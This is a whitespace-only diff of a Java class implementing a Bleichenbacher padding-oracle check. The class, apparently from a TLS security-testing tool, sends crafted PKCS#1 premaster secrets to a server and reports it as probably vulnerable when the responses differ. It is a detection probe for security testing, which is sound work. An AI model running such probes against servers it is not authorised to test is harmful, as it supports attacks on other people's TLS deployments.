@@ -50,82 +50,82 @@ public class BleichenbacherAttack extends Attacker<BleichenbacherCommandConfig> 
     private static final Logger LOGGER = LogManager.getLogger(BleichenbacherAttack.class);
 
     public BleichenbacherAttack(BleichenbacherCommandConfig config) {
-	super(config);
+        super(config);
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
-	RSAPublicKey publicKey;
-	try {
-	    publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(config);
-	    LOGGER.info("Fetched the following server public key: " + publicKey);
-	} catch (Exception e) {
-	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, No connection possible: {}", config.getConnect(),
-		    e.getLocalizedMessage());
-	    return;
-	}
+        RSAPublicKey publicKey;
+        try {
+            publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(config);
+            LOGGER.info("Fetched the following server public key: " + publicKey);
+        } catch (Exception e) {
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, No connection possible: {}", config.getConnect(),
+                    e.getLocalizedMessage());
+            return;
+        }
 
-	List<ProtocolMessage> protocolMessages = new LinkedList<>();
-	byte[][] vectors = PKCS1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType());
-	for (byte[] vector : vectors) {
-	    ProtocolMessage pm = executeTlsFlow(configHandler, vector);
-	    protocolMessages.add(pm);
-	}
+        List<ProtocolMessage> protocolMessages = new LinkedList<>();
+        byte[][] vectors = PKCS1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType());
+        for (byte[] vector : vectors) {
+            ProtocolMessage pm = executeTlsFlow(configHandler, vector);
+            protocolMessages.add(pm);
+        }
 
-	LOGGER.info("The following list of protocol messages was found (the last protocol message in the client-server communication):");
-	for (ProtocolMessage pm : protocolMessages) {
-	    LOGGER.info("Sent Type: {}", pm.getProtocolMessageType());
-	    if (pm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
-		AlertMessage alert = (AlertMessage) pm;
-		AlertDescription ad = AlertDescription.getAlertDescription(alert.getDescription().getValue());
-		AlertLevel al = AlertLevel.getAlertLevel(alert.getLevel().getValue());
-		LOGGER.info("  Alert {}: {}", al, ad);
-	    }
-	}
-	HashSet<ProtocolMessage> protocolMessageSet = new HashSet<>(protocolMessages);
-	StringBuilder sb = new StringBuilder("[");
-	for (ProtocolMessage pm : protocolMessageSet) {
-	    sb.append(pm.toCompactString()).append(' ');
-	}
-	sb.append(']');
-	if (protocolMessageSet.size() == 1) {
-	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, NOT vulnerable, one message found: {}", config.getConnect(),
-		    sb.toString());
-	    vulnerable = false;
-	} else {
-	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Vulnerable (probably), found: {}", config.getConnect(),
-		    sb.toString());
-	    vulnerable = true;
-	}
+        LOGGER.info("The following list of protocol messages was found (the last protocol message in the client-server communication):");
+        for (ProtocolMessage pm : protocolMessages) {
+            LOGGER.info("Sent Type: {}", pm.getProtocolMessageType());
+            if (pm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
+                AlertMessage alert = (AlertMessage) pm;
+                AlertDescription ad = AlertDescription.getAlertDescription(alert.getDescription().getValue());
+                AlertLevel al = AlertLevel.getAlertLevel(alert.getLevel().getValue());
+                LOGGER.info("  Alert {}: {}", al, ad);
+            }
+        }
+        HashSet<ProtocolMessage> protocolMessageSet = new HashSet<>(protocolMessages);
+        StringBuilder sb = new StringBuilder("[");
+        for (ProtocolMessage pm : protocolMessageSet) {
+            sb.append(pm.toCompactString()).append(' ');
+        }
+        sb.append(']');
+        if (protocolMessageSet.size() == 1) {
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, NOT vulnerable, one message found: {}", config.getConnect(),
+                    sb.toString());
+            vulnerable = false;
+        } else {
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Vulnerable (probably), found: {}", config.getConnect(),
+                    sb.toString());
+            vulnerable = true;
+        }
 
     }
 
     private ProtocolMessage executeTlsFlow(ConfigHandler configHandler, byte[] encryptedPMS) {
-	// we are initializing a new connection in every loop step, since most
-	// of the known servers close the connection after an invalid handshake
-	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
-	TlsContext tlsContext = configHandler.initializeTlsContext(config);
-	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+        // we are initializing a new connection in every loop step, since most
+        // of the known servers close the connection after an invalid handshake
+        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+        TlsContext tlsContext = configHandler.initializeTlsContext(config);
+        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 
-	WorkflowTrace trace = tlsContext.getWorkflowTrace();
-	RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) trace
-		.getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
-	ModifiableByteArray epms = new ModifiableByteArray();
-	epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
-	cke.setEncryptedPremasterSecret(epms);
-	try {
-	    FileOutputStream fos = new FileOutputStream("/tmp/test.xml");
-	    WorkflowTraceSerializer.write(fos, trace);
-	} catch (IOException | JAXBException ex) {
-	    ex.printStackTrace();
-	}
+        WorkflowTrace trace = tlsContext.getWorkflowTrace();
+        RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) trace
+                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
+        ModifiableByteArray epms = new ModifiableByteArray();
+        epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
+        cke.setEncryptedPremasterSecret(epms);
+        try {
+            FileOutputStream fos = new FileOutputStream("/tmp/test.xml");
+            WorkflowTraceSerializer.write(fos, trace);
+        } catch (IOException | JAXBException ex) {
+            ex.printStackTrace();
+        }
 
-	workflowExecutor.executeWorkflow();
+        workflowExecutor.executeWorkflow();
 
-	tlsContexts.add(tlsContext);
+        tlsContexts.add(tlsContext);
 
-	transportHandler.closeConnection();
-	return trace.getAllConfiguredMessages().get(trace.getAllConfiguredMessages().size() - 1);
+        transportHandler.closeConnection();
+        return trace.getAllConfiguredMessages().get(trace.getAllConfiguredMessages().size() - 1);
     }
 
 }
